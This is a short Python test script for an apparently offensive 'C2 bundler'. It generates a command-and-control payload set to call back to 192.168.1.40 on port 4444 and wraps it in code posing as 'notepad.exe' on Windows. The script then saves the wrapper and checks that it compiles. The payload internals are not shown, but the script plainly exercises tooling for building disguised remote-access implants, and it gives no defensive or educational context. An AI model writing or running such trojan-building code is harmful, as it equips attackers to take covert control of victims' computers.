#!/usr/bin/env python3
"""
Test si le wrapper génère correctement
"""

import sys
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).parent / "src"))

from c2_bundler_simple import C2Bundler

# Create bundler
bundler = C2Bundler()

# Generate payload
print("[*] Generating payload...")
payload = bundler.generate_payload("192.168.1.40", 4444, 2)
print(f"[+] Payload generated: {len(payload)} bytes")

# Create wrapper
print("\n[*] Creating wrapper...")
wrapper = bundler._create_wrapper_code("notepad.exe", payload, "windows")

# Save wrapper to file for inspection
output_file = Path(__file__).parent / "wrapper_test.py"
with open(output_file, "w", encoding="utf-8") as f:
    f.write(wrapper)

print(f"[+] Wrapper saved to: {output_file}")
print(f"[+] Wrapper length: {len(wrapper)} bytes")
print("\n[*] First 50 lines:")
print("\n".join(wrapper.split("\n")[:50]))

# Check for syntax errors
print("\n[*] Checking syntax...")
try:
    compile(wrapper, "<wrapper>", "exec")
    print("[+] ✅ No syntax errors!")
except SyntaxError as e:
    print(f"[!] ❌ SYNTAX ERROR: {e}")
    print(f"[!] Line {e.lineno}: {e.text}")
